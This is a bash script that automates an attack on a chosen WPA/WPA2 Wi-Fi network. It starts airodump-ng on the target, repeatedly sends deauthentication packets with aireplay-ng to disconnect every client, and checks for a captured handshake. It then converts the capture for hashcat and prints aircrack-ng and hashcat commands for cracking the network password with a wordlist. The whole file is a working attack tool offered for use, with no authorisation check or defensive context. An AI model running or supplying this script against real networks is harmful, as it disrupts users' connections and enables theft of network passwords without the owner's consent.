#!/bin/bash

# Handshake Capture Tool - Optimized WPA/WPA2 handshake capture
# Automated deauth and handshake verification

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

print_info() { echo -e "${GREEN}[+]${NC} $1"; }
print_warning() { echo -e "${YELLOW}[!]${NC} $1"; }
print_error() { echo -e "${RED}[-]${NC} $1"; }
print_success() { echo -e "${GREEN}[✓]${NC} $1"; }

if [ "$EUID" -ne 0 ]; then
    print_error "Run as root"
    exit 1
fi

INTERFACE="$1"
BSSID="$2"
CHANNEL="$3"
ESSID="$4"

if [ -z "$INTERFACE" ] || [ -z "$BSSID" ] || [ -z "$CHANNEL" ]; then
    echo "Usage: $0 <monitor_interface> <bssid> <channel> [essid]"
    exit 1
fi

OUTPUT_DIR="./handshakes"
mkdir -p "$OUTPUT_DIR"

CAPTURE_FILE="$OUTPUT_DIR/handshake_${BSSID//:/_}_$(date +%Y%m%d_%H%M%S)"

print_info "Target: $ESSID ($BSSID) on channel $CHANNEL"
print_info "Starting handshake capture..."

# Start airodump-ng
airodump-ng -c "$CHANNEL" --bssid "$BSSID" -w "$CAPTURE_FILE" "$INTERFACE" &
AIRODUMP_PID=$!

sleep 5

# Function to check for handshake
check_handshake() {
    if ls "${CAPTURE_FILE}"-*.cap 1> /dev/null 2>&1; then
        if aircrack-ng "${CAPTURE_FILE}"-*.cap 2>&1 | grep -q "1 handshake"; then
            return 0
        fi
    fi
    return 1
}

# Try to capture handshake
ATTEMPTS=0
MAX_ATTEMPTS=5

while [ $ATTEMPTS -lt $MAX_ATTEMPTS ]; do
    ATTEMPTS=$((ATTEMPTS + 1))
    
    print_info "Attempt $ATTEMPTS/$MAX_ATTEMPTS: Sending deauth packets..."
    
    # Deauth all clients
    timeout 20 aireplay-ng --deauth 10 -a "$BSSID" "$INTERFACE" 2>&1 || true
    
    sleep 15
    
    if check_handshake; then
        print_success "Handshake captured successfully!"
        kill $AIRODUMP_PID 2>/dev/null || true
        
        print_info "Handshake file: ${CAPTURE_FILE}-01.cap"
        print_info "Crack with: aircrack-ng -w wordlist.txt ${CAPTURE_FILE}-01.cap"
        
        # Also convert to hashcat format if possible
        if command -v hcxpcapngtool &> /dev/null; then
            print_info "Converting to hashcat format..."
            hcxpcapngtool -o "${CAPTURE_FILE}.22000" "${CAPTURE_FILE}"-*.cap 2>&1
            print_info "Hashcat file: ${CAPTURE_FILE}.22000"
            print_info "Crack with: hashcat -m 22000 ${CAPTURE_FILE}.22000 wordlist.txt"
        fi
        
        exit 0
    fi
    
    print_warning "No handshake yet, trying again..."
done

kill $AIRODUMP_PID 2>/dev/null || true
print_error "Failed to capture handshake after $MAX_ATTEMPTS attempts"
print_info "Partial capture saved to: ${CAPTURE_FILE}-01.cap"
print_warning "Try again when clients are more active"

exit 1
